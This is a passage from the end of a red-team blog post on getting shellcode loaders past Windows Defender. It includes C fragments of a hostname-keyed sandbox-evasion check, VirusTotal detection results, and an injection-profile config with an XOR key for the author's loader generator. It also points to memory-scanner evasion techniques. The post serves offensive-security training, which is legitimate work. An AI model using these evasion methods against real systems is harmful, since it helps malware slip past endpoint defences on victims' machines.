</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">StartupSuccess</span>     <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">WriteSuccess</span>       <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">ProtectSuccess</span>     <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPSTR</span>               <span class="n">Hostname</span>           <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span> <span class="mi">32</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span>                <span class="n">GetHostnameSuccess</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPSTR</span>               <span class="n">GuardrailHostname</span>  <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span> <span class="mi">32</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x5A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x49</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x45</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x52</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="n">GetHostnameSuccess</span> <span class="o">=</span> <span class="nf">GetHostname</span><span class="p">(</span> <span class="n">Hostname</span> <span class="p">)</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;GetComputerName failed (%d).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">()</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="p">(</span> <span class="nf">strcmp</span><span class="p">(</span> <span class="n">Hostname</span><span class="p">,</span> <span class="n">GuardrailHostname</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;Goodbye, let&#39;s drop an artifact too! :)</span><span class="se">\n</span><span class="s">&#34;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DropArtifact</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span></code></pre></div><p>By the way, the <code>GuardrailHostname</code> translates to <code>ZAVIER</code> in ASCII.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPSTR</span> <span class="n">GuardrailHostname</span>  <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span> <span class="mi">32</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x5A</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x49</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x45</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GuardrailHostname</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>     <span class="o">=</span> <span class="mh">0x52</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span> <span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GuardrailHostname</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Despite being bullied by VT earlier, let&rsquo;s upload this onto VT once again.</p>
<p><img alt="vt" src="https://i.gyazo.com/8a40dc391a0346685f2f8f4fecf26ef3.png"></p>
<p>Detections dropped drastically to 8/71 or <strong>11.2%</strong>, but let&rsquo;s see what the sandboxes think about it.</p>
<p><img alt="bruh" src="https://i.gyazo.com/e32dccb5f61789c121b31d81590e78e9.png"></p>
<p><img alt="bruh" src="https://i.gyazo.com/ef39c1f8e9a5868d767be3463df2a316.png"></p>
<p>Seems like our guardrails have worked, however the simple comparison can be simply jumped over by patching the <code>JNE</code> instruction. Whether sandboxes are capable of doing this action, no one really knows lol.</p>
<p>For better coverage, I&rsquo;d recommend encrypting your shellcode with the target hostname- so that the shellcode decryption routine will error out if the hostname was incorrect.</p>
<p>There&rsquo;s an extremely deep rabbithole on sandbox evasion, but here&rsquo;s something else that I found while scrolling around.</p>
<p><img alt="vm" src="https://i.gyazo.com/a61f4474c06c2f80fe3868048a5e682c.png"></p>
<p><a href="https://unprotect.it/category/sandbox-evasion/">unprotect.it</a> also has a quite list of sandbox evasion techniques.</p>
<h3 id="tldr">TLDR</h3>
<p>Don&rsquo;t upload shit onto VT, do your dev work on a VM with no internet access and always check if you&rsquo;re in a debugger or sandbox.</p>
<h2 id="advice-on-evasion">Advice on Evasion</h2>
<p>I have been getting more into the operational side of red teaming recently, especially after doing RastaLabs and CRTO. Although writing shellcode loaders is fun, it can be <em>quite</em> annoying when you have to make loads of them on the fly for different payloads.</p>
<p>Windows Defender evasion can be a serious pain in the ass if you haven&rsquo;t written an evasive loader in a bit, especially when it comes to reusing loaders and re-encrypting shellcode.</p>
<blockquote>
<p>Have you ever had to encrypt and copy paste <code>sliver</code> shellcode? (BTW, <code>sliver</code> shellcode can be up to 10 MB large)</p>
</blockquote>
<p>This process can be irritating for a lazy person such as myself who doesn&rsquo;t want to set up stagers to catch shellcode, although in real engagements- I don&rsquo;t know a single person who doesn&rsquo;t endorse stagers.</p>
<p><img alt="stager" src="https://i.gyazo.com/d99380ec8740ec60d9d0f2502d8226ff.png"> (image from: <a href="https://blog.spookysec.net/stage-v-stageless-1/">https://blog.spookysec.net/stage-v-stageless-1/</a>)</p>
<h3 id="automation">Automation</h3>
<p>Earlier, we wrote a script that encrypts shellcode and spits them out into output files that can be directly included into projects as headers.</p>
<p>This was just one of the many small little scripts I&rsquo;ve written to make my life just a little bit easier when writing stageless loaders, although I do stage my payloads when it&rsquo;s more convenient.</p>
<p>I collated all my little scripts and ideas together to make a tool called <a href="https://github.com/gatariee/ldrgen">ldrgen</a> that I frequently use to make templated loaders that I can reuse over and over again.</p>
<p>A separate blog post will probably be made about this tool, but just throwing it out there incase anyone finds it useful :)</p>
<p>For those curious, I used <a href="https://github.com/gatariee/ldrgen/blob/main/profiles/ebapc.json">this profile</a> for all my labs that involve Windows Defender and I have never noticed it when dropping to disk.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;EBAPC&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;author&#34;</span><span class="p">:</span> <span class="s2">&#34;@gatari&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;Earlybird APC Shellcode Injection with XOR&#39;ed shellcode &amp; a little bit of sandbox evasion.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;template&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/opt/tools/ldrgen/templates/config.yaml&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;EarlyBirdAPC_Buffed&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;enc_type&#34;</span><span class="p">:</span> <span class="s2">&#34;xor&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;substitutions&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;key&#34;</span><span class="p">:</span> <span class="s2">&#34;as@&amp;(!L@J#JKsn&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;pname&#34;</span><span class="p">:</span> <span class="s2">&#34;C:\\\\Windows\\\\System32\\\\cmd.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;arch&#34;</span><span class="p">:</span> <span class="s2">&#34;x64&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;compile&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;automatic&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;make&#34;</span><span class="p">:</span> <span class="s2">&#34;make&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;gcc&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;x64&#34;</span><span class="p">:</span> <span class="s2">&#34;x86_64-w64-mingw32-gcc&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;x86&#34;</span><span class="p">:</span> <span class="s2">&#34;i686-w64-mingw32-gcc&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;strip&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;i686&#34;</span><span class="p">:</span> <span class="s2">&#34;strip&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&#34;x86_64&#34;</span><span class="p">:</span> <span class="s2">&#34;strip&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;output_dir&#34;</span><span class="p">:</span> <span class="s2">&#34;./ldr&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h3 id="takeaways">Takeaways</h3>
<p>Evasion is <em>not as easy</em> as it was 6 years ago, but it <em>is</em> relatively easy to evade Windows Defender.</p>
<p>My experience with Windows Defender is that getting through it initially is not too difficult, the difficulty comes with doing post-exploitation activities with Defender constantly watching.</p>
<p>Windows Defender enjoys scanning executable sections of memory; during a <strong>memory scan</strong>, if your shellcode is unencrypted in memory- it will likely get caught and killed. If you&rsquo;re interested in post-exploitation beacon activities, you can look into general sleep mask techniques such as: <a href="https://github.com/Cracked5pider/Ekko">Ekko</a>, <a href="https://github.com/mgeeky/ShellcodeFluctuation">Shellcode Fluctuation</a>, <a href="https://github.com/realoriginal/foliage">Foliage</a> and this amazing talk by <a href="https://twitter.com/kyleavery_">Kyle Avery</a> on <a href="https://www.youtube.com/watch?v=edIMUcxCueA">Avoiding Memory Scanners</a></p>
<p>That being said, I think that evading Windows Defender is not a feat that should be down-played and it&rsquo;s certainly a step in the right direction for all aspiring developers.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/gatariee" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
<a href="https://x.com/gatariee" target="_blank" rel="noopener noreferrer me"
    title="X">
    <svg viewBox="0 0 1200 1227" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path
        d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"/>
</svg>
</a>
<a href="https://www.linkedin.com/in/zavierlee-sg/" target="_blank" rel="noopener noreferrer me"
    title="Linkedin">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
    <rect x="2" y="9" width="4" height="12"></rect>
    <circle cx="4" cy="4" r="2"></circle>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2025 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
